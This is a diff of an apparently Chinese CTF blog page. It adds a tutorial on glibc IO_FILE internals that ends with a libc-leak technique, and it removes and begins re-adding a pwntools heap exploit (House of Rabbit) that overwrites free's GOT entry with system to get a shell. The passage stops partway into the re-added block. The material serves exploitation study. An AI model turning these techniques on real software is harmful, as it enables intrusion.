@@ -155,6 +155,125 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/26/IO-file%E5%85%A5%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.png">
+      <meta itemprop="name" content="Sn0r1ax">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome!">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/05/26/IO-file%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">IO file入门</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-05-26 17:19:33 / 修改时间：22:09:44" itemprop="dateCreated datePublished" datetime="2025-05-26T17:19:33+08:00">2025-05-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>这里分析的是给glibc2.23的源码为例</p>
+<p>在<code>libio/libio/h</code>中有这样一个结构体</p>
+<h2 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>结构体中有一个<code>_IO_FILE</code>类型的变量和一个<code>_IO_jump_t</code>类型的指针,这个指针就是<code>vtable</code>(虚表)</p>
+<p>我们接着往下看</p>
+<h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. 标志着这个结构的状态,请往下看*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer 读缓冲区当前指针位置*/</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. 读缓冲区结束位置*/</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. 读缓冲区基地址*/</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. 写缓冲区基地址*/</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. 写缓冲区当前指针位置*/</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. 写缓冲区结束位置*/</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. 缓冲区基地址*/</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. 缓冲区结束地址*/</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. 保存缓冲区基地址*/</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area 备份缓冲区基地址*/</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. 保存缓冲区结束地址*/</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span> <span class="comment">//标记指针,用于跟踪缓冲区读写位置</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span> <span class="comment">//文件链表</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno; <span class="comment">//文件描述符</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2; <span class="comment">//第二个文件标志</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small. 过去的文件偏移(已弃用) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column; <span class="comment">//当前列号(用于支持列计算)</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset; <span class="comment">//虚函数表偏移量</span></span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>]; <span class="comment">//短缓冲区</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock; <span class="comment">//文件锁</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>这里的文件链表即将文件描述符链起来的链表</p>
+<p><img src="/../images/IO-file%E5%85%A5%E9%97%A8/0.png" alt="0"></p>
+<p>从右到左文件描述符分别为0,1,2</p>
+<p>这三个部分在程序启动时就会初始化,且这仨是位于libc上的,之前也见过泄露其地址来获得libc基址的情况</p>
+<p>因为是在程序运行后才进行初始化,所以我们可以在bss段找到它们</p>
+<p><img src="/../images/IO-file%E5%85%A5%E9%97%A8/1.png" alt="1"></p>
+<h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);               <span class="comment">// 占位符，没有实际功能</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);              <span class="comment">// 占位符，没有实际功能</span></span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);        <span class="comment">// 完成操作的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);    <span class="comment">// 写缓冲区溢出处理函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);  <span class="comment">// 读缓冲区欠载处理函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);      <span class="comment">// 读缓冲区欠载处理函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);  <span class="comment">// 处理推回字符的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);        <span class="comment">// 写入多个字符的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);        <span class="comment">// 读取多个字符的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);      <span class="comment">// 按偏移量移动文件指针的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);      <span class="comment">// 移动文件指针到指定位置的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);        <span class="comment">// 设置缓冲区的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);            <span class="comment">// 同步文件流的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);<span class="comment">// 分配缓冲区的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);            <span class="comment">// 读取数据的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);          <span class="comment">// 写入数据的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);            <span class="comment">// 移动文件指针的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);          <span class="comment">// 关闭文件流的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);            <span class="comment">// 获取文件状态的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);  <span class="comment">// 显示可用字符数的函数指针</span></span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);          <span class="comment">// 设置区域设置信息的函数指针</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="JUMP-FIRLD宏"><a href="#JUMP-FIRLD宏" class="headerlink" title="JUMP_FIRLD宏"></a>JUMP_FIRLD宏</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></span><br></pre></td></tr></table></figure>
+
+<p><code>JUMP_FIELD(size_t, __dummy);</code>即<code>size_t __dummy</code></p>
+<p>看起来没啥用,应该是为了方便统一进行管理</p>
+<h2 id="flag标志位"><a href="#flag标志位" class="headerlink" title="flag标志位"></a>flag标志位</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000           <span class="comment">/* Magic number 文件结构体的魔数，用于标识文件结构体的有效性 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000    <span class="comment">/* Emulate old stdio 模拟旧的标准输入输出库（stdio）行为的魔数 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000      <span class="comment">/* Magic mask 魔数掩码，用于从 _flags 变量中提取魔数部分 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1                 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. 用户拥有缓冲区，不在关闭时删除缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2               <span class="comment">/* Unbuffered 无缓冲模式，直接进行I/O操作，不使用缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4                 <span class="comment">/* Reading not allowed 不允许读取操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8                <span class="comment">/* Writing not allowed 不允许写入操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10              <span class="comment">/* EOF seen 已经到达文件结尾（EOF） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20              <span class="comment">/* Error seen 已经发生错误 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40     <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. 不关闭文件描述符 _fileno，在清理时不调用 close 函数 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80                <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all. 链接到一个链表（使用 _chain 指针），用于 streambuf::_list_all */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100            <span class="comment">/* In backup 处于备份模式 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200             <span class="comment">/* Line buffered 行缓冲模式，在输出新行时刷新缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400         <span class="comment">/* Set if put and get pointer logically tied. 在输出和输入指针逻辑上绑定时设置 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800    <span class="comment">/* Currently putting 当前正在执行 put 操作 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000        <span class="comment">/* Is appending 处于附加模式（在文件末尾追加内容） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000          <span class="comment">/* Is file buffer 是一个文件缓冲区 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000            <span class="comment">/* Bad seen 遇到错误（bad flag set） */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000           <span class="comment">/* User lock 用户锁定，防止其他线程访问 */</span></span></span><br></pre></td></tr></table></figure>
+
+<p>一般情况下我们只需要将其标志位改为0xFBAD1800就行了</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>_IO_FILE_plus</code>结构体中有俩变量,一个是<code>_IO_FILE</code>类型的,这个结构体中定义了关于该文件的一系列指针,其中包含了一个<code>_IO_FILE</code>类型的指针,构成了一个链表</p>
+<p><code>_IO_jump_t</code>体中定义了一系列对文件数据进行操作的指针</p>
+<h1 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h1><p>缓冲区是一块临时储存数据的区域,我们在进行读写操作时,数据都会先进入缓冲区</p>
+<p>例如<code>scanf</code>函数,我们从键盘键入的数据会先写入输入缓冲区<code>stdin</code>,然后函数再从输入缓冲区中取出数据写入对应地址,直到遇到\n(如果格式控制字符串没有限制读入字节的话),当<code>scanf</code>函数在缓冲区遇到空格,制表符,换行符时会自动跳过,将其留在缓冲区,这也是为什么我们再使用<code>scanf</code>进行输入时一般会跟一个<code>getchar</code>函数来读取缓冲区的换行符.对于指定字节的格式例如<code>%16s</code>就只会从缓冲区中取出0xf个字节(剩下一个字符是\0)放入指定地址中,剩下的数据仍然留在缓冲区</p>
+<p>输入的缓冲区默认是<code>stdin</code>,输出的缓冲区默认是<code>stdout</code></p>
+<p>例如<code>puts</code>函数,我们执行一个<code>puts(&quot;hello&quot;)</code>时,会将字符串“hello”连同一个\n写入输出缓冲区,那么写入到输出缓冲区了,要怎么才能在输出设备如终端上看见呢?</p>
+<p>在输出缓冲区遇到\n时就会触发标准输出缓冲区刷新操作,这个操作会将输出缓冲区的数据写入到实际的输出设备中,我们就可以在终端上看见了</p>
+<p>又如c++中的输出语句<code>std::cout &lt;&lt; &quot;Hello&quot; &lt;&lt; std::endl;</code>向输出缓冲区写入“Hello”然后再使用<code>std::endl</code>来刷新缓冲区输出数据</p>
+<p>那么<code>stderr</code>又是谁的默认缓冲区呢,它是错误输出的默认缓冲区,而且他的缓冲模式是无缓冲,而其他俩的默认缓冲模式在连接到终端时是行缓冲模式</p>
+<h2 id="三种缓冲模式"><a href="#三种缓冲模式" class="headerlink" title="三种缓冲模式"></a>三种缓冲模式</h2><p>我们经常碰到这种语句</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这就是在将这三个文件流设置为无缓冲模式</p>
+<p>三种缓冲模式有什么区别呢?</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th align="left">无缓冲</th>
+<th>行缓冲</th>
+<th>全缓冲</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>触发条件</td>
+<td align="left">标准错误输出默认采用</td>
+<td>连接到交互式终端时默认采用</td>
+<td>连接到非终端设备(文件,管道)时默认采用</td>
+</tr>
+<tr>
+<td>写入时机</td>
+<td align="left">每次I&#x2F;O调用时直接写入</td>
+<td>遇到<code>\n</code>时,缓冲区写满时或遇到显示调用<code>fflush</code>时写入</td>
+<td>缓冲区写满或显示调用<code>fflush</code>&#x2F;<code>fclose</code>时写入</td>
+</tr>
+</tbody></table>
+<h1 id="利用方式简述"><a href="#利用方式简述" class="headerlink" title="利用方式简述"></a>利用方式简述</h1><p>通过修改<code>_IO_write_base</code>和<code>_IO_write_ptr</code>这两个变量的值来达到任意地址写,不过一般只需要将<code>_IO_write_base</code>的值改小来泄露libc就足够了</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14582">先知社区</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/23/House-Of-Rabbit/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -186,7 +305,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-05-25 14:04:57" itemprop="dateModified" datetime="2025-05-25T14:04:57+08:00">2025-05-25</time>
+                <time title="修改时间：2025-05-26 17:58:18" itemprop="dateModified" datetime="2025-05-26T17:58:18+08:00">2025-05-26</time>
               </span>
 
           
@@ -271,7 +390,7 @@
 <li>然后再申请那个超大分支,使remainder就位于ptr那个位置</li>
 <li>然后通过修改ptr的值达到任意地址写</li>
 </ol>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf = ELF(<span class="string">&#x27;./mutepig&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line">context(arch=elf.arch, os=elf.os,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process([elf.path])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote()</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG <span class="keyword">and</span> local:</span><br><span class="line">	gdb.attach(io, </span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;	</span></span><br><span class="line"><span class="string">	b 0x400bce</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p    = <span class="keyword">lambda</span>      : pause()</span><br><span class="line">ru   = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">r    = <span class="keyword">lambda</span> x    : io.recv(x)</span><br><span class="line">s    = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl   = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia   = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla  = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa   = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x    : u32(r(x).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x    : u64(r(x).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> x,y  : log.success(<span class="built_in">str</span>(x) + <span class="string">&#x27; -&gt; &#x27;</span> + <span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    p()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">     sl(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="keyword">case</span>,content</span>):</span><br><span class="line">     menu(<span class="number">1</span>)</span><br><span class="line">     sl(<span class="built_in">str</span>(<span class="keyword">case</span>))</span><br><span class="line">     s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">     menu(<span class="number">2</span>)</span><br><span class="line">     sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content1,content2</span>):</span><br><span class="line">     menu(<span class="number">3</span>)</span><br><span class="line">     sl(<span class="built_in">str</span>(idx))</span><br><span class="line">     s(content1)</span><br><span class="line">     s(content2)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    add(<span class="number">3</span>,<span class="string">b&#x27;snor&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="string">b&#x27;lax&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    dele(<span class="number">1</span>)<span class="comment">#扩大top chunk</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#构造fastbin链</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    payload0 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x11</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>)[:<span class="number">7</span>]</span><br><span class="line">    <span class="comment">#dbg()</span></span><br><span class="line">    edit(<span class="number">2</span>,p64(<span class="number">0x602130</span>)[:<span class="number">7</span>],payload0)</span><br><span class="line">    add(<span class="number">3</span>,<span class="string">b&#x27;3&#x27;</span>)<span class="comment">#将fakechunk归入bin中</span></span><br><span class="line">    <span class="comment">#更改fake chunk的size</span></span><br><span class="line">    payload1 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xa00001</span>)</span><br><span class="line">    <span class="comment">#dbg()</span></span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>,payload1)</span><br><span class="line">    add(<span class="number">3</span>,<span class="string">b&#x27;4&#x27;</span>)<span class="comment">#faekchunk入largebin</span></span><br><span class="line">    <span class="comment">#free_plt = 0x0000000000602018</span></span><br><span class="line">    payload2 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xfffffffffffffff1</span>)<span class="comment">#case13337申请0xFFFFFFFFFFFFFF70LL </span></span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;3&#x27;</span>,payload2)</span><br><span class="line">    add(<span class="number">13337</span>,<span class="string">b&#x27;5&#x27;</span>)<span class="comment">#这里执行过后remainder位于0x6020b0</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>])[:<span class="number">7</span>])<span class="comment">#这里free_got就在0x6020c0处</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])[:<span class="number">7</span>],p64(<span class="number">0x70</span>)[:<span class="number">7</span>])<span class="comment">#通过0索引修改free_got</span></span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#dbg()</span></span><br><span class="line">    ia()</span><br></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 